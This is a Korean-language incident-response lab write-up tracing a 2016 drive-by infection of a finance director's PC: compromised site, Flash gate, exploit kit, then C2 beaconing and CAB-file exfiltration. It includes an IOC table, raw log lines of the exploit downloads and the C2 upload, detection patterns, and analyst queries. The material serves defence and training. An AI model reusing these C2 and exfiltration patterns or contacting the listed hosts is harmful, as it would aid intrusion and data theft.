| 21:28:17 | 해킹된 쇼핑몰 로딩(요청 88개) |
| 21:28:23 | DNS `lsbery[.]tk` → 85.93.0.32 |
| **21:28:24** | **첫 악성 이벤트**: `GET /shop.php?sid=…` → 게이트 Flash(1,983 B) |
| 21:28:25 | `GET /hot.php?id=…` → 이동, DNS `bsbkxs.zdxwx3m[.]pw` → 86.106.93.167 |
| 21:28:26 | EK 랜딩 `/civis/index.php?PHPSESSID=3.b7&action=…`(약 100KB) |
| 21:28:27 | Flash Player 버전 확인: **15.0.0.189** |
| 21:28:29 | `GET /charge.zhtml?…` → **Flash 익스플로잇**(38,557 B), POST `/civis/so.cpg` |
| 21:28:32 | `GET /today.jst?…` → **암호화된 페이로드**(360,468 B) |
| 21:28:39 | 악성코드의 연결 확인 `nssdc.gsfc.nasa[.]gov`(UA MSIE 8.0) |
| 21:28:40 | DNS `tplandthepropforcontent[.]com` → 185.86.77.12, 192.210.137.123(TTL 59) |
| **21:28:41** | **첫 C2 체크인**(185.86.77.12) |
| **21:28:52** | **첫 CAB 업로드**(`CTU.bmp`) |
| 21:30:43 / 21:30:54 | 체크인 / CAB 업로드 `uD27YPGr.bmp`("6D45.bin") |
| 21:31:02 | C2 DNS 다시(응답 순서 바뀜, TTL 43) |
| 21:31:03 | C2가 192.210.137.123으로 바뀜, **모듈 다운로드 230,507 B**, UA 문자열이 IE11로 |
| 21:32:39 / 21:33:03 | 체크인(`i.gif`, `lron1.jpeg`) |
| 21:33:16 | CAB 업로드 `qS.bmp` |
| 21:35:00 | 체크인(`B9F.jpeg`) |
| 21:35:15 | CAB 업로드 `Pspw_2F.bmp` |
| **21:36:39** | **PCAP 끝** — C2 계속 활동 중 |

### IOC 표 { #iocs }

| 종류 | 값 | 역할 | 조치 |
|---|---|---|---|
| 호스트 | 10.41.245.114 / Dekker-PC | 피해 PC(재무이사) | 격리 / 조사 |
| MAC | 00:17:31:7d:52:ba (ASUSTek) | 피해 PC 랜카드 | 장비 찾기 |
| 도메인 / IP | www.source-werbeartikel[.]com / 213.174.33.141 | 해킹된 정상 사이트(Magento) | 모니터링 / 소유자 통보(공유 호스팅) |
| 도메인 / IP | lsbery[.]tk / 85.93.0.32 | EK 게이트(Flash), Apache/2.2.15 CentOS | 차단 |
| 도메인 / IP | bsbkxs.zdxwx3m[.]pw (*.zdxwx3m[.]pw) / 86.106.93.167 | 익스플로잇 킷, nginx/1.2.1 | 차단 |
| 도메인 | tplandthepropforcontent[.]com | C2(라운드 로빈) | 차단 |
| IP | 185.86.77.12 (RIPE), 192.210.137.123 (ARIN) | C2 | 차단 |
| URI 패턴 | `/images/<base64 조각>/<x>.gif\|jpeg\|bmp` | C2 비콘 / 업로드 | 탐지 |
| URI 패턴 | `/shop.php?sid=<16진수 64+>`, `/hot.php?id=<16진수 64+>` | EK 게이트 | 탐지 |
| URI 패턴 | `/index.php?PHPSESSID=<x>&action=<x>` | EK 랜딩 | 탐지 |
| UA | Win7/IE11 PC의 `Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)` | 악성코드 | 헌팅 |
| 업로드 | multipart `name="upload_file" filename="XXXX.bin"`, 내용 `MSCF` | 유출 | 탐지 |
| MD5 | cf90ba155fda322eeadd2fdeb4368849 | EK Flash 익스플로잇 | 정보 조회 |
| MD5 | 4466cd2032944d03ffe9d4d7d74083c2 | EK 페이로드(암호화) | 정보 조회 |
| MD5 | 032557398230f49a5310a9a60f00e33b | C2 모듈(암호화) | 정보 조회 |
| MD5 | 5e251668b8a3e02e9da376d6f7da8229 | 게이트 Flash | 정보 조회 |
| 소프트웨어 | Adobe Flash Player 15.0.0.189 | 공격당한 취약 소프트웨어 | 제거 / 패치 |
| 행동 | nssdc.gsfc.nasa[.]gov 텍스트 파일 요청 | 악성코드 연결 확인 | 참고만(정상 사이트) |

### 호스트 오퍼레이터를 위한 단서 { #host-leads }

EK 감염은 메일 첨부와 호스트 흔적이 다릅니다. 부모 프로세스가 `wscript.exe`가 아니라 **`iexplore.exe`나 Flash 플러그인**입니다.

1. Dekker-PC를 **격리**하고 **재부팅 전에 메모리를 수집**하세요 — 페이로드가 암호화돼 왔고 메모리에서만 실행됐을 수 있습니다.
2. 시간 범위: **21:28:17 – 21:28:41 UTC**(익스플로잇 → 첫 C2).
3. **프로세스 생성** — *Sysmon 이벤트 ID 1*(프로세스가 생성됨, 명령줄 포함) / *Security 4688*(새 프로세스가 생성됨): 21:28:30~21:28:40쯤 `iexplore.exe`나 Flash의 예상 못 한 자식 프로세스.
4. **네트워크 연결** — *Sysmon 이벤트 ID 3*(프로세스가 네트워크에 연결함): 185.86.77.12 / 192.210.137.123과 통신한 프로세스.
5. **인젝션** — *Sysmon 이벤트 ID 8*(CreateRemoteThread: 한 프로세스가 다른 프로세스 안에 스레드를 만듦)과 *이벤트 ID 10*(한 프로세스가 다른 프로세스 메모리에 접근함), 대상 `iexplore.exe`/`explorer.exe`.
6. **파일** — *Sysmon 이벤트 ID 11*(파일이 생성됨): 21:28쯤 `%TEMP%` / `%APPDATA%`의 새 실행파일/DLL, `XXXX.bin` 이름의 CAB 파일.
7. **지속성** — *Sysmon 이벤트 ID 13*(레지스트리 값이 설정됨, Run/RunOnce 키)과 *Security 4698*(예약 작업이 만들어짐).
8. **Flash 15.0.0.189 제거/업그레이드.**
9. Ursnif 계열은 자격 증명과 은행 정보를 훔칩니다 → **Justini Dekker의 도메인 계정과 재무/은행 자격 증명을 재설정**하고 21:28 이후 재무 시스템 접근을 검토하세요.

### 다른 단서 — 메일 { #other-leads }

메일 7통은 이 캡처에는 없지만 **직원 5명에게 실제 위협**입니다(우선순위: culyanova — 시스템 관리자, smunro와 jdekker — 두 번 노려짐). 그들의 트래픽을 뽑거나 호스트를 조사하고, [B12](#email-campaigns)의 제목과 첨부 이름으로 모든 메일함을 검색하도록 권고합니다.

---

## 침해사고 티켓 { #ticket }

작업자, 경로, SHA256 값은 자리표시입니다. 작업 로그 시각은 예시입니다. 티켓 본문은 팀 양식대로 영어로 씁니다.

```text
==========================================================================================
TICKET: Drive-by Exploit Kit infection and active C2 / data exfiltration - Dekker-PC
==========================================================================================
Prepared by     : Analyst (Team1)                     Prepared: 261118
Hand-off to     : MC / Host Operator / Hunt brick
Severity        : HIGH - confirmed compromise, active C2, outbound data upload (Finance Director host)
Status          : Network analysis complete - host triage required

#SUMMARY#
On 2016-02-05 at 21:28Z host 10.41.245.114 (Dekker-PC, user Justini Dekker, Finance Director)
browsed to a compromised website (www.source-werbeartikel.com). Injected content sent the
browser through a Flash-based gate (lsbery.tk) to an exploit kit (bsbkxs.zdxwx3m.pw) that
delivered a Flash exploit against an outdated Flash Player (15.0.0.189) and an encrypted
payload (360,468 bytes). Within ~8 seconds of payload delivery the host began C2 check-ins to
tplandthepropforcontent.com (185.86.77.12 / 192.210.137.123), downloaded a further encrypted
module (230,507 bytes) and uploaded 4 CAB-compressed files to the C2 (data exfiltration).
Patterns consistent with Angler EK (2016) and Ursnif (Gozi-ISFB) C2 - UNCONFIRMED (closed
network, no hash reputation lookup). The 7 phishing emails provided separately are NOT related
to this capture (no email IOCs or mail traffic observed) - separate lead, see OTHER LEADS.

#SEARCH QUERIES#
MOLOCH (Arkime):
  ip == 10.41.245.114 && (ip.dst == [213.174.33.141, 85.93.0.32, 86.106.93.167, 185.86.77.12, 192.210.137.123] || host.dns == [www.source-werbeartikel.com, lsbery.tk, bsbkxs.zdxwx3m.pw, tplandthepropforcontent.com])
  ip == 86.106.93.167
  ip == 185.86.77.12 || ip == 192.210.137.123
SPLUNK (Zeek, all time; use ts - _time is index time):
  index=zeek sourcetype=zeek:dhcp | table _time client_addr mac host_name msg_types
  index=zeek sourcetype=zeek:http id_resp_h IN (85.93.0.32, 86.106.93.167, 184.28.188.184, 128.183.114.107, 185.86.77.12, 192.210.137.123) | eval t=strftime(ts,"%H:%M:%S") | table t id_resp_h method uri referrer status_code resp_mime_types request_body_len response_body_len user_agent | sort t
  index=zeek sourcetype=zeek:dns query IN ("*werbeartikel*", "*lsbery*", "*zdxwx3m*", "*tplandthe*") | eval t=strftime(ts,"%H:%M:%S") | table t query answers TTLs
  index=zeek sourcetype=zeek:files mime_type IN ("-", "application/x-shockwave-flash", "application/vnd.ms-cab-compressed") | eval t=strftime(ts,"%H:%M:%S") | table t tx_hosts rx_hosts mime_type seen_bytes

#EVIDENCE LOCATIONS#
Team1: /home/<analyst>/Downloads/Investigation1.pcap  (original, SHA256 <insert>)
Team1: /home/<analyst>/evidence/261118_dekker-pc_full.pcap  (full capture export, SHA256 <insert>)
Team1: /home/<analyst>/evidence/http_objects/  (tshark --export-objects http - DO NOT EXECUTE)
  Sessions of interest: 21:28:17-21:36:39Z, IPs per IOC table.

#OPERATION LOG#
[261118 2050, Analyst] Reviewing 7 phishing emails provided (headers/attachments) - Found: 3 campaigns, zipped .js downloaders, recipients mtsutsumi, jdekker(x2), smunro(x2), mtraugott, culyanova
[261118 2055, Analyst] Identifying data sources in Splunk (tstats by index/sourcetype) - Found: index=zeek (conn, dhcp, dns, files, http, ssl, x509); index=main sourcetype=csv = Snort alert.log
[261118 2100, Analyst] Identifying hosts in PCAP (zeek:conn) - Found: single originator 10.41.245.114 (321 conns)
[261118 2102, Analyst] Looking for mail traffic (25/110/143/465/587/993/995) - Not Found
[261118 2103, Analyst] Looking for phishing email sender IPs in PCAP - Not Found
[261118 2104, Analyst] Locating IDS alerts for 10.41.245.114 - Not Found: alert.log only contains test rule sid 1000100 on unrelated 2025-04-24 traffic
[261118 2115, Analyst] Identifying host 10.41.245.114 via DHCP - Found: Dekker-PC, MAC 00:17:31:7d:52:ba (Justini Dekker, Finance Director)
[261118 2116, Analyst] Note: Splunk _time = index time (all events 2026-11-18 08:46:31); Zeek ts used for event times
[261118 2125, Analyst] Establishing PCAP time range - Found: 2016-02-05 21:24:05 to 21:36:39 UTC
[261118 2126, Analyst] Comparing capture with Dekker emails (Email 2 09:34Z, Email 6 18:23Z) - Not Found: no email IOC strings (cehost, love2date, hoast, mac7, t1host, faucibus, odioauctor) in any Zeek log; no exe/attachment download pattern
[261118 2127, Analyst] Reviewing HTTP user agents and file types from 10.41.245.114 - Found: "Shockwave Flash" UA, non-browser "MSIE 8.0" UA, 2x Flash, 3x unknown mime (encrypted) files
[261118 2132, Analyst] Following HTTP referrer chain - Found: www.source-werbeartikel.com -> lsbery.tk (85.93.0.32) -> bsbkxs.zdxwx3m.pw (86.106.93.167)
[261118 2133, Analyst] Identifying exploit delivery - Found: Flash exploit /charge.zhtml and encrypted payload /today.jst from 86.106.93.167; client Flash 15.0.0.189 (outdated)
[261118 2134, Analyst] Identifying post-infection traffic - Found: connectivity check to nssdc.gsfc.nasa.gov; C2 /images/<base64>/*.gif|jpeg|bmp to 185.86.77.12 and 192.210.137.123
[261118 2140, Analyst] Resolving domains for suspicious IPs (zeek:dns) - Found: see IOC table
[261118 2141, Analyst] Checking DNS for C2 IPs - Not Found (query error, see correction 2205)
[261118 2200, Analyst] Verifying infection chain sessions in Arkime - Found: 21 sessions 21:28:17-21:36:39Z matching Zeek findings
[261118 2202, Analyst] Reviewing C2 HTTP Host header - Found: tplandthepropforcontent.com for both C2 IPs
[261118 2204, Analyst] Reviewing gate lsbery.tk sessions - Found: /shop.php Flash gate (x-flash-version), /hot.php redirect
[261118 2205, Analyst] CORRECTION to 2141: C2 domain tplandthepropforcontent.com WAS resolved via 10.2.41.7 at 21:28:40Z and 21:31:02Z (round-robin); earlier "no DNS" result caused by comma-joined answers field in TSV logs - Found
[261118 2210, Analyst] Reviewing EK sessions on 86.106.93.167 - Found: landing, Flash exploit served once (2nd request 404), payload application/octet-stream
[261118 2212, Analyst] Reviewing C2 session 185.86.77.12 (49297) - Found: GET beacon (empty 200 response) + POST multipart upload_file "6D45.bin" starting "MSCF" (CAB) - data exfiltration
[261118 2213, Analyst] CORRECTION: 4x application/vnd.ms-cab-compressed in zeek:files are the 4 CAB uploads to C2, not Windows CTL downloads - Found
[261118 2214, Analyst] Assessing malware family from C2/upload pattern - Further Analysis Required: consistent with Ursnif (Gozi-ISFB), unconfirmed
[261118 2220, Analyst] Reviewing C2 session 192.210.137.123 (49303) - Found: 230,507-byte encrypted module; UA switched to IE11 string but no Accept headers (non-browser)
[261118 2221, Analyst] Comparing C2 server HTTP Date headers - Found: 192.210.137.123 ~58 min clock skew vs 185.86.77.12 (separate servers behind one domain)
[261118 2222, Analyst] Hash reputation lookup - Not Performed: closed network; MD5 recorded for MC/intel follow-up
[261118 2230, Analyst] Writing Snort rules for gate/EK/C2/exfil (sid 1000101-1000111) - Found
[261118 2345, Analyst] Testing Snort rules against full PCAP - Found: all rules fired as expected, 0 alerts on benign traffic

#TOOL OUTPUT / NOTES#
[261118 2100, Analyst] index=zeek sourcetype=zeek:conn | stats count by id_orig_h
  10.41.245.114   321   (only originator in capture - host of interest)
[261118 2102, Analyst] zeek:conn id_resp_p IN (25,110,143,465,587,993,995) -> 0 results
[261118 2103, Analyst] email sender IPs 213.133.123.17, 212.232.52.106, 67.222.128.148, 68.66.77.76, 61.9.189.140, 185.60.133.27 -> 0 results
[261118 2104, Analyst] index=main sourcetype=csv "10.41.245.114" -> 0 results
  alert.log content: 04/24-10:33:29 ,1,1000100,0,"test",TCP,10.0.0.167,51671,40.97.190.2,993,...  (unrelated test data)
[261118 2115, Analyst] zeek:dhcp: client_addr 10.41.245.114 mac 00:17:31:7d:52:ba (ASUSTek) host_name Dekker-PC msg_types REQUEST/INFORM
  Gateway MAC 88:43:e1:6c:b4:5a (Cisco). Internal DNS 10.2.41.7, 10.2.41.8.
  Employee list: Dekker, Justini H. | justini.dekker | Finance Director | jdekker@<customer-domain> | 555-5189
[261118 2116, Analyst] All zeek events have _time 2026-11-18 08:46:31 (ingest time). Event time from Zeek ts.
[261118 2125, Analyst] stats min(ts) max(ts): 321 conns 2016-02-05 21:24:05 - 21:36:39 UTC
[261118 2126, Analyst] index=zeek ("cehost" OR "love2date" OR "hoast" OR "mac7" OR "t1host" OR "faucibus" OR "odioauctor") -> 0 results
[261118 2127, Analyst] User agents: IE11 browser "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko";
  21:28:27 184.28.188.184 UA "Shockwave Flash"; 21:28:39 128.183.114.107 and 21:28:41 185.86.77.12 UA "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)" (non-browser)
  zeek:files mime "-" x3 (593,407 bytes), x-shockwave-flash x2, vnd.ms-cab-compressed x4
[261118 2132, Analyst] Referrer chain:
  21:28:24 10.41.245.114:49257 -> 85.93.0.32:80 GET lsbery.tk/shop.php?sid=4046AAB187AB2C1563B214BE7AC6702950B304E2E9E1696E18244B8501B268FD92DA0D313D2273E24C283B
           Referer http://www.source-werbeartikel.com/  200 application/x-shockwave-flash  UA IE11
  21:28:25 10.41.245.114:49258 -> 85.93.0.32:80 GET lsbery.tk/hot.php?id=<same>  Referer http://www.source-werbeartikel.com/  200 text/html
  21:28:26 10.41.245.114:49279 -> 86.106.93.167:80 GET bsbkxs.zdxwx3m.pw/civis/index.php?PHPSESSID=3.b7&action=714324p02212u2q4548f8
           Referer http://lsbery.tk/hot.php?id=<same>  200 text/html (~100 KB)
[261118 2133, Analyst] Exploit delivery (server nginx/1.2.1):
  21:28:27 -> 184.28.188.184:80 GET /get/flashplayer/update/current/install/version.xml15.0.0.189~installVector=1&...  UA "Shockwave Flash"
  21:28:29 :49278 -> 86.106.93.167:80 GET /charge.zhtml?dead=sVShjH&society=KgXs1bcH&level=O29Gm9T3&go=VdL&once=XN3S3cuYQ&way=Z41t&nothing=sTJVXv7X&art=Jw
           x-flash-version; 200 application/x-shockwave-flash 38,557 bytes, MD5 cf90ba155fda322eeadd2fdeb4368849; 2nd request 404
  21:28:32 :49284 -> 86.106.93.167:80 GET /today.jst?technical=_MNsOrB&captain=&something=gxPx-&own=&themselves=T_wh7g5&eye=l3_LBg&citizen=zdelxIDGFLQvZFA8KbsEuiX
           Referer http://lsbery.tk/hot.php?id=...  200 application/octet-stream 360,468 bytes, MD5 4466cd2032944d03ffe9d4d7d74083c2
[261118 2134, Analyst] 21:28:39 -> 128.183.114.107:80 GET nssdc.gsfc.nasa.gov/planetary/text/nasa_pr_20001220.txt UA MSIE 8.0 (connectivity check)
[261118 2140, Analyst] zeek:dns: 21:28:15 www.source-werbeartikel.com 213.174.33.141; 21:28:23 lsbery.tk 85.93.0.32;
  21:28:25 bsbkxs.zdxwx3m.pw 86.106.93.167; 21:28:39 nssdc.gsfc.nasa.gov 128.183.114.107
[261118 2200, Analyst] Arkime: 21 sessions 2016/02/05 21:28:17 - 21:36:39 UTC
[261118 2202, Analyst] Arkime: Host "tplandthepropforcontent.com" on all sessions to 185.86.77.12 and 192.210.137.123
[261118 2204, Analyst] Arkime: lsbery.tk 85.93.0.32:80 Apache/2.2.15 (CentOS); /shop.php x-flash-version, Flash, Body MD5 5e251668b8a3e02e9da376d6f7da8229
[261118 2205, Analyst] zeek:dns query="*tplandthe*":
  ts 1454707720.899691 (21:28:40.9Z) :56313 -> 10.2.41.7:53 A tplandthepropforcontent.com NOERROR 185.86.77.12,192.210.137.123 TTL 59
  ts 1454707862.298827 (21:31:02.3Z) :56397 -> 10.2.41.7:53 A tplandthepropforcontent.com NOERROR 192.210.137.123,185.86.77.12 TTL 43
[261118 2210, Analyst] Arkime 86.106.93.167: 49279 landing+POST (MD5s 49143103a3e0a8e6fb35d02c61aa710e, f51880eb438f66a8de9fd674e1a036fb, 27776220a96b24954d66fb137f4ff01a);
  49278 Flash exploit MD5 cf90ba155fda322eeadd2fdeb4368849 (200, 404); 49284 payload MD5 4466cd2032944d03ffe9d4d7d74083c2
[261118 2212, Analyst] Arkime 49297 -> 185.86.77.12:80 natural view:
  GET /images/N6bsv2yg/.../QPYTXoSJXUZ9/3.gif  UA MSIE 8.0  Host tplandthepropforcontent.com  (no Accept headers)
    -> 200 nginx Content-Length 0
  POST /images/yGOF1OPRgpsNLYRRXk/.../uD27YPGr.bmp  multipart/form-data  Content-Length 430
    name="upload_file"; filename="6D45.bin"  body starts "MSCF" (CAB)  -> 200 Content-Length 0
[261118 2213, Analyst] CAB uploads: 21:28:52 CTU.bmp, 21:30:54 uD27YPGr.bmp (185.86.77.12); 21:33:16 qS.bmp, 21:35:15 Pspw_2F.bmp (192.210.137.123)
[261118 2220, Analyst] Arkime 49303 -> 192.210.137.123:80 GET /images/lYPocsAb06v/.../i.jpeg UA IE11 string, no Accept
  -> 200 nginx Date 22:28:56 GMT application/octet-stream 230,507 bytes, MD5 032557398230f49a5310a9a60f00e33b
  Idle connections (SYN only, 0/420 bytes): 49304, 49318, 49331, 49381
[261118 2222, Analyst] MD5s: 5e2516... gate Flash; cf90ba15... EK Flash; 4466cd20... EK payload; 03255739... C2 module. SHA256 <generate>
[261118 2345, Analyst] snort -c snort.conf -r Investigation1.pcap -A console -q -k none -U
  1000101 DNS lsbery.tk 1 | 1000102 DNS *.zdxwx3m.pw 1 | 1000103 DNS C2 2 | 1000104 C2 SYN 10 | 1000105 gate 2 |
  1000106 landing 1 | 1000108 payload 1 | 1000109 C2 Host 10 | 1000110 beacon 6 | 1000111 CAB upload 4 | benign 0

#SNORT RULES#
(sid 1000101-1000111 as in Part F)

#LEADS FOR HOST OPERATOR#
Isolate Dekker-PC, memory capture before reboot; window 21:28:17-21:28:41Z; children of iexplore.exe/Flash
(Sysmon 1 / 4688); network by process (Sysmon 3); injection (Sysmon 8/10); new files in %TEMP%/%APPDATA%
(Sysmon 11); persistence (Sysmon 13, 4698); remove Flash 15.0.0.189; reset Dekker's domain and finance credentials.

#OTHER LEADS#
7 phishing emails (zipped .js) to mtsutsumi, jdekker x2, smunro x2, mtraugott, culyanova - not in this capture;
pull traffic / triage those hosts (priority culyanova, smunro, jdekker), search mailboxes for the subjects/attachments.
```

---

## 복사용 쿼리 모음 { #query-sheet }

`<…>`를 바꿔 쓰세요. 옛날 데이터는 Splunk 시간 범위를 **All time**으로, `_time`이 이상하면 `_time` 대신 `ts`를 쓰세요.

**Splunk — 데이터 파악**

```spl
| tstats count where index=* by index sourcetype
```

```spl
index=zeek sourcetype=zeek:conn
| stats count min(ts) as first max(ts) as last by id_orig_h
| eval first=strftime(first, "%Y-%m-%d %H:%M:%S"), last=strftime(last, "%Y-%m-%d %H:%M:%S")
| sort - count
```

```spl
index=zeek sourcetype=zeek:dhcp
| table _time client_addr assigned_addr mac host_name domain msg_types
```

**Splunk — PC가 한 일**

```spl
index=zeek sourcetype=zeek:conn id_orig_h=<host-IP>
| stats count sum(orig_bytes) as sent sum(resp_bytes) as received min(ts) as first by id_resp_h id_resp_p service
| eval first=strftime(first, "%H:%M:%S")
| sort first
```

```spl
index=zeek sourcetype=zeek:http id_orig_h=<host-IP>
| stats count min(ts) as first sum(response_body_len) as bytes values(method) as method values(status_code) as status values(resp_mime_types) as mime values(user_agent) as ua by id_resp_h
| eval first=strftime(first, "%H:%M:%S")
| sort first
```

```spl
index=zeek sourcetype=zeek:http id_resp_h IN (<IP1>, <IP2>)
| eval t=strftime(ts, "%H:%M:%S")
| table t id_resp_h method uri referrer status_code resp_mime_types request_body_len response_body_len user_agent
| sort t
```

```spl
index=zeek sourcetype=zeek:files
| stats count sum(seen_bytes) as bytes by mime_type
| sort - count
```

```spl
index=zeek sourcetype=zeek:dns (query="*<domain-part>*" OR answers="*<IP>*")
| eval t=strftime(ts, "%H:%M:%S")
| table t query answers TTLs
| sort t
```

```spl
index=zeek ("<ioc-string-1>" OR "<ioc-string-2>")
| table _raw
```

**Splunk — 캡처에 메일이 있을 때**

```spl
index=zeek sourcetype=zeek:smtp
| table ts uid id_orig_h id_resp_h helo mailfrom rcptto from subject tls last_reply fuids
```

```spl
index=zeek sourcetype=zeek:ssl id_resp_p=25
| table ts id_orig_h id_resp_h version cipher server_name
```

```spl
index=zeek sourcetype=zeek:conn id_resp_p=25
| stats count dc(id_orig_h) as senders by id_resp_h
```

**Arkime**

```text
ip == <host-IP> && ip.dst == [<IP1>, <IP2>]
ip == <host-IP> && (ip.dst == [<IP1>, <IP2>] || host.dns == [<domain1>, <domain2>])
host.dns == *<domain-part>*
host.http == *<domain-part>*
http.uri == *<string>*
email.fn == <attachment-name>
ip.src == <host-IP> && http.method == POST
```

**메일 / 파일 (분석 VM)**

```bash
echo '<base64 첫 줄>' | base64 -d | xxd | head -4
unzip -l <file>.zip
unzip -p <file>.zip | sha256sum
tshark -r <file>.pcap --export-objects http,<folder>
```

**Snort**

```bash
sudo snort -T -c /etc/snort/snort.conf
sudo snort -c /etc/snort/snort.conf -r <file>.pcap -A console -q -k none -U -l /tmp/snorttest | grep -o "\[1:[0-9]*:[0-9]*\] [^[]*" | sort | uniq -c
```

---

## 배운 점 { #lessons }

1. **뻔한 원인은 결론이 아니라 가설입니다.** 같은 사용자, 같은 날의 피싱이 결정적으로 보였지만, 시간대, 메일 흔적 없음, 완벽한 웹 사슬이 다른 답을 냈습니다. 증거가 결정하게 하고, "일어나지 않았다"가 아니라 "이 캡처에서는 관찰되지 않았다"라고 쓰세요.
2. **믿기 전에 데이터를 확인하세요.** `_time`은 넣은 시각이었고, Splunk의 `host`가 Zeek의 `host`를 가렸고, `answers`는 쉼표로 이은 글자였고, Snort CSV에는 제목 줄이 없었습니다. 각각이 처음 답을 틀리게 만들었습니다.
3. **틀린 건 드러내고 고치세요.** 티켓에 정정이 네 개 있습니다(C2 DNS, CAB 파일, 공격자 시간대, "브라우저 인젝션" 해석). 정정 줄을 추가하고 지우지 마세요.
4. **User-Agent와 헤더는 *누가* 요청했는지 알려 줍니다.** `Shockwave Flash`, IE11 PC의 IE8, `Accept` 헤더 없음으로 브라우저, 플러그인, 악성코드를 구분했습니다.
5. **referrer로 사슬을 다시 세웁니다.** 사이트 → 게이트 → EK, 몇 초 만에.
6. **수백 KB짜리 `-`(알 수 없는 MIME) = 아마 암호화.** 매직 바이트는 메일에서처럼 네트워크에서도 중요합니다.
7. **폐쇄망이어도 결론은 낼 수 있습니다.** 해시는 다른 사람을 위해 기록하고, 행동으로 판단하고, 계열은 "consistent with … – unconfirmed"로 적으세요.
8. **룰은 PCAP으로 테스트하세요**(`-k none`, `HOME_NET` 확인, sid별 개수), 정상 트래픽으로 오탐도 확인하세요.
9. **STARTTLS는 메일을 센서에서 숨깁니다.** IP 룰과 `ssl.log`로는 여전히 전달을 증명할 수 있습니다.

## 참고 { #references }

- [익스플로잇 킷 알아보기](../../training/blue-team-essentials/http-analysis/exploit-kits-practice.md) · [트래픽 속 Base64](../../training/blue-team-essentials/http-analysis/base64.md) · [User-Agent와 쿠키](../../training/blue-team-essentials/http-analysis/user-agents-cookies.md)
- [Zeek: conn](../../network/zeek/conn-log.md) · [dns](../../network/zeek/dns-log.md) · [http](../../network/zeek/http-log.md) · [files](../../network/zeek/files-log.md)
- [Arkime 검색 문법](../../network/arkime/search-syntax.md) · [Arkime로 PCAP 분석하기](../../network/arkime/offline-pcap-guide.md)
- [SPL 치트시트](../splunk/spl-cheatsheet.md) · [데이터 파악과 시간](../splunk/data-discovery.md)
- [DC/SMB 공격용 Snort 룰](../../training/pcap-ir-labs/dc-smb-and-snort-rules.md) · [비콘과 C2](../../network/beaconing-c2.md)
- [플레이북: 감염된 워크스테이션](../playbooks/compromised-workstation.md) · [플레이북: 데이터 유출](../playbooks/data-exfiltration.md)
